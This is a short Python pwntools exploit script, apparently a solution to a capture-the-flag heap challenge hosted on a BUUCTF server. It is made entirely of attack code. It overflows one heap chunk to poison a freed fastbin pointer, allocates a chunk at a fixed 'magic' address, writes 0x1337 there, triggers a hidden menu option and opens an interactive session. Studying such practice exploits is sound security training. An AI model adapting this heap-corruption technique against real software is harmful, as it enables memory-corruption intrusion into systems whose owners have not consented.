from pwn import *

context.arch = 'amd64'

magic_address = 0x60208D

p = remote('node4.buuoj.cn', 25569)


def create(_size, content):
    p.sendlineafter(':', '1')
    p.sendlineafter(': ', str(_size))
    p.sendlineafter(':', content)


def edit(index, _size, content):
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str(index))
    p.sendlineafter(': ', str(_size))
    p.sendlineafter(': ', content)


def delete(index):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str(index))


create(0x60, 'hello')  # 0
create(0x60, 'hello')  # 1
delete(1)
edit(0, 0x80, b'a' * 0x60 + flat([0, 0x71, magic_address]))
create(0x60, 'hello')  # 1
create(0x60, b'a' * 0x3 + pack(0x1337))
p.sendlineafter(':', '4869')
p.recvline()
p.interactive()
